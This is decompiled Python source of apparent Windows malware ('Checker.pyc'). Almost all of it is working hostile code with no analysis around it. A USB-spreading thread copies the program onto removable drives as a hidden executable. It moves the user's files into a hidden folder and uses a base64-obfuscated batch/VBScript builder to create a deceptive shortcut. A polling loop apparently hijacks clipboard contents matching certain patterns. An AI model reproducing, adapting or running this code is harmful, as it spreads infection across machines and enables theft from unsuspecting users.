            if pattern.startswith(k):
                return v

    except:
        pass


class uspr(threading.Thread):

    def run(self):
        while 1:
            try:
                bitmask = ctypes.windll.kernel32.GetLogicalDrives()
                for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
                    drive = ('{}:\\').format(letter)
                    if bitmask & 1 and ctypes.windll.kernel32.GetDriveTypeW(drive) == 2:
                        mounted_letters = subprocess.Popen('wmic logicaldisk where deviceid="%s:" get Size' % letter, startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                        length = mounted_letters.stdout.readlines()[1].strip()
                        if not length.isdigit():
                            continue
                        volume_name_buffer = ctypes.create_unicode_buffer(1024)
                        ctypes.windll.kernel32.GetVolumeInformationW(drive, volume_name_buffer, ctypes.sizeof(volume_name_buffer), None, None, None, None, None)
                        if len(volume_name_buffer.value) == 0:
                            lnk_name = 'Removable Disk'
                        else:
                            lnk_name = volume_name_buffer.value
                        hidden_folder = os.path.join(drive, unichr(160))
                        if not os.path.exists(hidden_folder):
                            os.mkdir(hidden_folder)
                        ctypes.windll.kernel32.SetFileAttributesW(hidden_folder, 2)
                        destination_file_path = os.path.join(drive, 'VolumeInformationUSB.exe')
                        if not os.path.exists(destination_file_path):
                            shutil.copyfile(sys.argv[0], destination_file_path)
                            ctypes.windll.kernel32.SetFileAttributesW(destination_file_path, 2)
                            time.sleep(5)
                        if os.path.getsize(destination_file_path) != os.path.getsize(sys.argv[0]):
                            try:
                                os.remove(destination_file_path)
                            except:
                                pass

                            shutil.copyfile(sys.argv[0], destination_file_path)
                            ctypes.windll.kernel32.SetFileAttributesW(destination_file_path, 2)
                        lnkfile = os.path.join(drive, lnk_name + '.lnk')
                        cmdline = ['cmd', '/q', '/k', 'echo off']
                        sc = 'QGVjaG8gb2ZmDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjZCAvZCAlcw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyBTZXQgb1dTID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKSA+IENyZWF0ZVNob3J0Y3V0LnZicw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyBzTGlua0ZpbGUgPSAiJXMiID4+IENyZWF0ZVNob3J0Y3V0LnZicw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyBTZXQgb0xpbmsgPSBvV1MuQ3JlYXRlU2hvcnRjdXQoc0xpbmtGaWxlKSA+PiBDcmVhdGVTaG9ydGN1dC52YnMNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVjaG8gb0xpbmsuVGFyZ2V0UGF0aCA9ICIlcyIgPj4gQ3JlYXRlU2hvcnRjdXQudmJzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIG9MaW5rLldvcmtpbmdEaXJlY3RvcnkgPSAiJXMiID4+IENyZWF0ZVNob3J0Y3V0LnZicw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWNobyBvTGluay5EZXNjcmlwdGlvbiA9ICJTb2NpYWwgVXBkYXRlcyIgPj4gQ3JlYXRlU2hvcnRjdXQudmJzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIG9MaW5rLkljb25Mb2NhdGlvbiA9ICIlcyIgPj4gQ3JlYXRlU2hvcnRjdXQudmJzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlY2hvIG9MaW5rLlNhdmUgPj4gQ3JlYXRlU2hvcnRjdXQudmJzDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjc2NyaXB0IENyZWF0ZVNob3J0Y3V0LnZicw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGVsIENyZWF0ZVNob3J0Y3V0LnZicw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhpdA=='
                        batch = ('{}').format(base64.b64decode(sc)) % (
                         drive, os.path.join(drive, lnk_name + '.lnk'),
                         '%CD%\\VolumeInformationUSB.exe',
                         '%CD%',
                         (',').join((os.path.join(os.environ['windir'], 'system32', 'shell32.dll'), '8')))
                        if os.path.exists(lnkfile):
                            with open(lnkfile, 'rb') as (_f):
                                if 'VolumeInformationUSB' not in _f.read():
                                    cmd = subprocess.Popen(cmdline, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
                                    cmd.stdin.write(batch.encode('utf-8'))
                                    cmd.stdin.flush()
                        else:
                            cmd = subprocess.Popen(cmdline, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
                            cmd.stdin.write(batch.encode('utf-8'))
                            cmd.stdin.flush()
                        for content in os.listdir(drive):
                            if not content.endswith('.lnk') and not content.endswith('.vbs') and 'VolumeInformation' not in content:
                                try:
                                    shutil.move(os.path.join(drive, content), hidden_folder)
                                except:
                                    pass

                    bitmask >>= 1

            except:
                pass

            time.sleep(3)

        return


uspr = uspr()
uspr.start()
while 1:
    BUFF = win32_get()
    BUFF = str(BUFF).lstrip(' ').rstrip(' ')
    ICO = alias(BUFF)
    if ICO:
        win32_set(ICO)
    time.sleep(0.5)
# okay decompiling Checker.pyc

````

